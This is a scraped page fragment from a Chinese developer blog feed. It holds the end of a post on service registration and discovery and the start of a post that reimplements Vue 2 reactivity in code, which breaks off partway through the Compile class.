img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">一句话</h2>
<p><strong>分布式系统中，服务往往是独立运行的，他们之间如何交流也是有很多可以挖掘的点。让服务之间自动“找到彼此”，并建立连接，且在服务增删变化时，连接关系能自动调整，这就是服务注册和发现要做的事情</strong>。</p>
<h2 data-id="heading-1">为什么需要服务发现</h2>
<p><strong>例子 1：网关找登录服</strong></p>
<ul>
<li>登录服可能多台，地址也可能变。</li>
<li>如果靠配置文件写死，运维一改地址就会出错。</li>
<li>服务发现就像“自动通讯录”，登录服上线就自动加入，掉线就自动移除。</li>
</ul>
<h2 data-id="heading-2">服务发现要做到什么</h2>
<p>简单理解就是三件事：</p>
<ol>
<li><strong>注册</strong>：服务实例将自身节点信息写入注册中心（例如 Zookeeper），也就是服务自己把“我是谁、我的网络地址是什么” 写进去</li>
<li><strong>发现</strong>：订阅并获取自己关心的服务节点，即能拿到“我发现了哪些服务以及需要连接哪些服务”</li>
<li><strong>更新</strong>：服务变化时自动通知，变更不仅有“来/走”，还有“节点属性更新”（比如权重/版本变化）</li>
</ol>
<p><strong>通俗地说，对于一个服务：</strong></p>
<ul>
<li><strong>启动时先给我一张其他服务的完整名单</strong>（快照）</li>
<li><strong>运行中有服务加入或离开就通知我</strong>（增量订阅）</li>
</ul>
<p>这里其实有一个数据的一致性需求 ：启动时需要“全量快照”，运行时需要“增量变更”，避免漏连或重复。</p>
<h2 data-id="heading-3">实现方案</h2>
<h3 data-id="heading-4">1) 注册：服务自己告诉系统“我是谁”，我的地址是多少</h3>
<p>每个服务启动后把信息写进注册中心，通常就是 key-value 的形式，比如：</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">login.tcp.3</span> =&gt; <span class="hljs-number">10.1</span>.<span class="hljs-number">2.3</span>:<span class="hljs-number">8001</span>
</code></pre>
<p>这里，<code>login</code> 是服务类型，<code>tcp</code> 是地址的类型（也可以是http），<code>3</code> 是服务的编号，这对于有状态服务的区分比较重要。</p>
<p>如果要更多信息，也可以带上权重、版本、元数据：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-number">10.1</span><span class="hljs-number">.2</span><span class="hljs-number">.3</span>|<span class="hljs-number">8001</span>|<span class="hljs-number">20</span>|v1|<span class="hljs-punctuation">{</span><span class="hljs-attr">"region"</span><span class="hljs-punctuation">:</span><span class="hljs-string">"cn"</span><span class="hljs-punctuation">}</span>
</code></pre>
<h3 data-id="heading-5">2) 发现：获得别的服务的地址，关注地址变更</h3>
<p>服务启动后订阅自己关心的目标，例如：</p>
<ul>
<li>Gate 关心 Login、Router</li>
<li>Game 关心 Battle、Router</li>
</ul>
<p>当 Gate 启动时，需要先拿到 <strong>全量快照</strong>：</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">snapshot</span> = [login-<span class="hljs-number">1</span>, login-<span class="hljs-number">2</span>, login-<span class="hljs-number">3</span>, router-<span class="hljs-number">1</span>, router-<span class="hljs-number">2</span>]
</code></pre>
<p>这些服务的地址如果发生了变更，如权重从 20 变成 0，就需要关注。</p>
<h3 data-id="heading-6">3) 增量：有变化就通知</h3>
<p>如果登录服新增了一台：</p>
<pre><code class="hljs language-makefile" lang="makefile"><span class="hljs-section">新增: login-tcp-4</span>
</code></pre>
<p>订阅者收到事件后，只需要做一件事：  <code>建立和 login-tcp-4 的连接</code></p>
<p>如果 login-tcp-2 下线：</p>
<pre><code class="hljs language-makefile" lang="makefile"><span class="hljs-section">删除: login-2</span>
</code></pre>
<p>订阅者自动断开即可。</p>
<h2 data-id="heading-7">简化流程图（Mermaid）</h2>
<p>我们把上面的几个过程串联起来，得到一个流程图：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f3db1a2589d64661992088e01df545dc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56CB6LSi5ZCM6KGM:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770727319&amp;x-signature=nvNalqcuK%2Fd4JNIwYf%2FFW3mi8hw%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-8">更深入的点</h2>
<ol>
<li>在现代 kubernetes 云部署盛行的当下，服务注册和发现往往已经支持，但是如果需要自己来更细粒度更深度的定制和控制路由，自己实现一套服务注册和发现是很有必要的；</li>
<li>如果是 kubernetes 部署，服务注册的地址一般是 DNS 域名，因为服务本身的地址是会动态变化的；</li>
<li>在很多异构的系统中，往往由不同的语言来实现不同的服务，为了避免实现多套服务注册和发现，增加维护成本，可以将其抽象成agent 服务（以sidecar的形式部署），使用方用 gRPC 这种解耦的协议形式，和 agent 通信。</li>
</ol>
<h2 data-id="heading-9">总结</h2>
<ul>
<li>服务注册和发现做的是一套“自动通讯录 + 实时变更提醒”</li>
<li>快照解决“启动时看到全量”</li>
<li>增量解决“运行中看到变化”</li>
<li>可以挖掘更适合k8s及异构系统的实现方式</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Vue-响应式原理深度解析（含手写源码）]]></title>    <link>https://juejin.cn/post/7602463463105249326</link>    <guid>https://juejin.cn/post/7602463463105249326</guid>    <pubDate>2026-02-03T10:07:34.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602463463105249326" data-draft-id="7602303923171393545" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Vue-响应式原理深度解析（含手写源码）"/> <meta itemprop="keywords" content="前端,JavaScript,面试"/> <meta itemprop="datePublished" content="2026-02-03T10:07:34.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="发现一只大呆瓜"/> <meta itemprop="url" content="https://juejin.cn/user/180747382561607"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Vue-响应式原理深度解析（含手写源码）
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/180747382561607/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    发现一只大呆瓜
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T10:07:34.000Z" title="Tue Feb 03 2026 10:07:34 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">前言</h3>
<p>双向数据绑定是 Vue 的灵魂特性。它将 <strong>Model（数据层）</strong> 与 <strong>View（视图层）</strong> 紧密相连：JS 逻辑更新 Model，视图自动重绘；用户操作 View，数据自动同步。本文将带你从源码级别对比 Vue 2 与 Vue 3 在响应式实现上的异同。</p>
<h2 data-id="heading-1">一、 Vue 2：数据劫持 + 发布订阅</h2>
<h3 data-id="heading-2">1. 核心原理</h3>
<p>Vue 2 基于 <code>Object.defineProperty</code> 实现数据劫持，通过 <strong>Observer（监听器）</strong> 、<strong>Compile（解析器）</strong> 和 <strong>Watcher（订阅者）</strong> 的配合完成。</p>
<h3 data-id="heading-3">2. 关键步骤</h3>
<ol>
<li>
<p><strong>数据劫持 (Observer)</strong> ：遍历 <code>data</code> 属性，利用 <code>Object.defineProperty</code> 注入 <code>getter</code>（依赖收集）和 <code>setter</code>（分发更新）。</p>
</li>
<li>
<p><strong>模板解析 (Compile)</strong> ：解析指令（如 <code>v-model</code>）和插值表达式（<code>{{}}</code>），为每个绑定点创建一个 <strong>Watcher</strong>。</p>
</li>
<li>
<p><strong>依赖收集 (Dep)</strong> ：每个属性对应一个 <code>Dep</code> 容器。读取属性时，将对应的 Watcher 存入 Dep。</p>
</li>
<li>
<p><strong>派发更新 (Watcher)</strong> ：修改数据时会触发 <code>setter</code>，通知所有关联的 Watcher 执行 <code>update</code> 方法更新 DOM。</p>
</li>
</ol>
<h3 data-id="heading-4">3. 源码仿真实现</h3>
<pre><code class="hljs language-html" lang="html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"zh-CN"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Vue2 响应式原理简易实现<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
  <span class="hljs-comment">&lt;!-- 测试模板 --&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"app"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>{{ message }}<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">"message"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>年龄：{{ age }}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">"vm.age++"</span>&gt;</span>年龄+1<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>

  <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
    <span class="hljs-comment">//  1. 依赖收集器 Dep：管理所有 Watcher，数据变化时通知更新 </span>
    <span class="hljs-keyword">class</span> <span class="hljs-title class_">Dep</span> {
      <span class="hljs-title function_">constructor</span>(<span class="hljs-params"/>) {
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">subs</span> = []; <span class="hljs-comment">// 存储订阅者（Watcher 实例）</span>
      }

      <span class="hljs-comment">// 添加订阅者</span>
      <span class="hljs-title function_">addSub</span>(<span class="hljs-params">sub</span>) {
        <span class="hljs-keyword">if</span> (sub &amp;&amp; sub.<span class="hljs-property">update</span>) { <span class="hljs-comment">// 确保是合法的 Watcher</span>
          <span class="hljs-variable language_">this</span>.<span class="hljs-property">subs</span>.<span class="hljs-title function_">push</span>(sub);
        }
      }

      <span class="hljs-comment">// 通知所有订阅者更新</span>
      <span class="hljs-title function_">notify</span>(<span class="hljs-params"/>) {
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">subs</span>.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">sub</span> =&gt;</span> sub.<span class="hljs-title function_">update</span>());
      }
    }

    <span class="hljs-comment">//  2. 数据劫持器 Observer：劫持 data 所有属性的 get/set </span>
    <span class="hljs-keyword">class</span> <span class="hljs-title class_">Observer</span> {
      <span class="hljs-title function_">constructor</span>(<span class="hljs-params">data</span>) {
        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">observe</span>(data);
      }

      <span class="hljs-comment">// 遍历数据对象，劫持所有属性</span>
      <span class="hljs-title function_">observe</span>(<span class="hljs-params">data</span>) {
        <span class="hljs-keyword">if</span> (!data || <span class="hljs-keyword">typeof</span> data !== <span class="hljs-string">'object'</span>) {
          <span class="hljs-keyword">return</span>; <span class="hljs-comment">// 非对象直接返回</span>
        }

        <span class="hljs-comment">// 遍历对象的所有属性</span>
        <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(data).<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">key</span> =&gt;</span> {
          <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">defineReactive</span>(data, key, data[key]);
        });
      }

      <span class="hljs-comment">// 核心：用 Object.defineProperty 劫持单个属性</span>
      <span class="hljs-title function_">defineReactive</span>(<span class="hljs-params">obj, key, value</span>) {
        <span class="hljs-keyword">const</span> dep = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Dep</span>(); <span class="hljs-comment">// 每个属性对应一个 Dep</span>
        <span class="hljs-keyword">const</span> that = <span class="hljs-variable language_">this</span>; <span class="hljs-comment">// 保存 Observer 实例的 this</span>
        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">observe</span>(value); <span class="hljs-comment">// 递归劫持子属性（处理嵌套对象）</span>

        <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">defineProperty</span>(obj, key, {
          <span class="hljs-attr">enumerable</span>: <span class="hljs-literal">true</span>, <span class="hljs-comment">// 可枚举</span>
          <span class="hljs-attr">configurable</span>: <span class="hljs-literal">true</span>, <span class="hljs-comment">// 可配置</span>
          <span class="hljs-comment">// 读取属性时触发：收集依赖</span>
          <span class="hljs-title function_">get</span>(<span class="hljs-params"/>) {
            <span class="hljs-comment">// Dep.target 是当前正在执行的 Watcher，添加到 Dep 中</span>
            <span class="hljs-title class_">Dep</span>.<span class="hljs-property">target</span> &amp;&amp; dep.<span class="hljs-title function_">addSub</span>(<span class="hljs-title class_">Dep</span>.<span class="hljs-property">target</span>);
            <span class="hljs-keyword">return</span> value;
          },
          <span class="hljs-comment">// 赋值属性时触发：通知更新</span>
          <span class="hljs-title function_">set</span>(<span class="hljs-params">newValue</span>) {
            <span class="hljs-keyword">if</span> (newValue === value) <span class="hljs-keyword">return</span>; <span class="hljs-comment">// 值未变化则不处理</span>
            value = newValue;
            that.<span class="hljs-title function_">observe</span>(newValue); <span class="hljs-comment">// 使用保存的 that 调用 observe</span>
            dep.<span class="hljs-title function_">notify</span>(); <span class="hljs-comment">// 通知所有 Watcher 更新</span>
          }
        });
      }
    }

    <span class="hljs-comment">//  3. 订阅者 Watcher：连接 Observer 和 Compile，负责更新 DOM </span>
    <span class="hljs-keyword">class</span> <span class="hljs-title class_">Watcher</span> {
      <span class="hljs-comment">/**
       * <span class="hljs-doctag">@param</span> {<span class="hljs-type">Object</span>} <span class="hljs-variable">vm</span> - Vue 实例
       * <span class="hljs-doctag">@param</span> {<span class="hljs-type">string</span>} <span class="hljs-variable">expr</span> - data 中的属性名（如 'message'）
       * <span class="hljs-doctag">@param</span> {<span class="hljs-type">Function</span>} <span class="hljs-variable">cb</span> - 更新 DOM 的回调函数
       */</span>
      <span class="hljs-title function_">constructor</span>(<span class="hljs-params">vm, expr, cb</span>) {
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">vm</span> = vm;
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">expr</span> = expr;
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">cb</span> = cb;
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">oldValue</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getOldValue</span>(); <span class="hljs-comment">// 记录旧值</span>
      }

      <span class="hljs-comment">// 获取旧值：触发 get 方法，完成依赖收集</span>
      <span class="hljs-title function_">getOldValue</span>(<span class="hljs-params"/>) {
        <span class="hljs-title class_">Dep</span>.<span class="hljs-property">target</span> = <span class="hljs-variable language_">this</span>; <span class="hljs-comment">// 将当前 Watcher 挂载到 Dep.target</span>
        <span class="hljs-keyword">const</span> oldValue = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getVal</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">vm</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">expr</span>); <span class="hljs-comment">// 读取属性，触发 get</span>
        <span class="hljs-title class_">Dep</span>.<span class="hljs-property">target</span> = <span class="hljs-literal">null</span>; <span class="hljs-comment">// 收集完依赖后清空</span>
        <span class="hljs-keyword">return</span> oldValue;
      }

      <span class="hljs-comment">// 解析属性路径（处理嵌套对象，如 'user.name'）</span>
      <span class="hljs-title function_">getVal</span>(<span class="hljs-params">vm, expr</span>) {
        <span class="hljs-keyword">return</span> expr.<span class="hljs-title function_">split</span>(<span class="hljs-string">'.'</span>).<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">data, currentKey</span>) =&gt;</span> {
          <span class="hljs-keyword">return</span> data[currentKey];
        }, vm.<span class="hljs-property">$data</span>);
      }

      <span class="hljs-comment">// 数据变化时执行：更新 DOM</span>
      <span class="hljs-title function_">update</span>(<span class="hljs-params"/>) {
        <span class="hljs-keyword">const</span> newValue = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getVal</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">vm</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">expr</span>);
        <span class="hljs-keyword">if</span> (newValue !== <span class="hljs-variable language_">this</span>.<span class="hljs-property">oldValue</span>) {
          <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">cb</span>(newValue); <span class="hljs-comment">// 执行回调更新 DOM</span>
          <span class="hljs-variable language_">this</span>.<span class="hljs-property">oldValue</span> = newValue; <span class="hljs-comment">// 更新旧值</span>
        }
      }
    }

    <span class="hljs-comment">//  4. 模板解析器 Compile：解析 v-model 和 {{}}，创建 Watcher </span>
    <span class="hljs-keyword">class</span> <span class="hljs-title class_">Compile</span> {
      <span class="hljs-title function_">constructor</span>(<span class="hljs-params">el, vm</span>) {
        <span class="hljs-comment">// 获取挂载元素（支持选择器或 DOM 元素）</span>
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">el</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">isElementNode</span>(el) ? el : <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(el);
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">vm</span> = vm;
        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">el</span>) {
          <span class="hljs-comment">// 1. 将模板内容移到文档碎片中（减少 DOM 操作，提升性能）</span>
          <span class="hljs-keyword">const</span> fragment = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">node2Fragment</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">el</span>);
          <span class="hljs-comment">// 2. 解析模板中的指令和插值表达式</span>
          <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">compile</span>(fragment);
          <span class="hljs-comment">// 3. 将解析后的碎片放回原元素</span>
          <span class="hljs-variable language_">this</span>.<span class="hljs-property">el</span>.<span class="hljs-title function_">appendChild</span>(fragment);
        }
      }

      <span class="hljs-comment">// 判断是否是元素节点（如 div、input）</span>
      <span class="hljs-title function_">isElementNode</span>(<span class="hljs-params">node</span>) {
        <span class="hljs-keyword">return</span> node.<span class="hljs-property">nodeType</span> === <span class="hljs-number">1</span>;
      }

      <span class="hljs-comment">// 判断是否是指令（以 v- 开头）</span>
      <span class="hljs-title function_">isDirective</span>(<span class="hljs-params">attrName</span>) {
        <span class="hljs-keyword">return</span> attrName.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">'v-'</span>);
      }

      <span class="hljs-comment">// 将节点移到文档碎片</span>
      <span class="hljs-title function_">node2Fragment</span>(<span class="hljs-params">el</span>) {
        <span class="hljs-keyword">const</span> fragment = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createDocumentFragment</span>();
        <span class="hljs-keyword">let</span> firstChild;
        <span class="hljs-keyword">while</span> (firstChild = el.<span class="hljs-property">firstChild</span>) {
          fragment.<span class="hljs-title function_">appendChild</span>(firstChild); <span class="hljs-comment">// 移动节点（原节点会被移除）</span>
        }
        <span class="hljs-keyword">return</span> fragment;
      }

      <span class="hljs-comment">// 核心：解析文档碎片中的所有节点</span>
      <span class="hljs-title function_">compile</span>(<span class="hljs-params">fragment</span>) {
        <span class="hljs-keyword">const</span> childNodes = fragment.<span class="hljs-property">childNodes</span>;
        <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">from</span>(childNodes).<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">node</span> =&gt;</span> {
          <span class="hljs-comment">// 1. 处理元素节点（解析 v-model 等指令）</span>
          <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">isElementNode</span>(node)) {
            <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">compileElement</span>(node);
          } 
          <span class="hljs-comment">// 2. 处理文本节点（解析 {{}} 插值）</span>
          <span class="hljs-keyword">else</span> {
            <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">compileText</span>(node);
          }
          <span class="hljs-comment">// 递归解析子节点（处理嵌套模板）</span>
          <span class="hljs-keyword">if</span> (node.<span class="hljs-property">childNodes</span> &amp;&amp; node.<span class="hljs-property">childNodes</span>.<span class="hljs-property">length</span>) {
            <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">compile</span>(node);
          }
        });
      }

      <span class="hljs-comment">// 解析元素节点（如 v-model）</span>
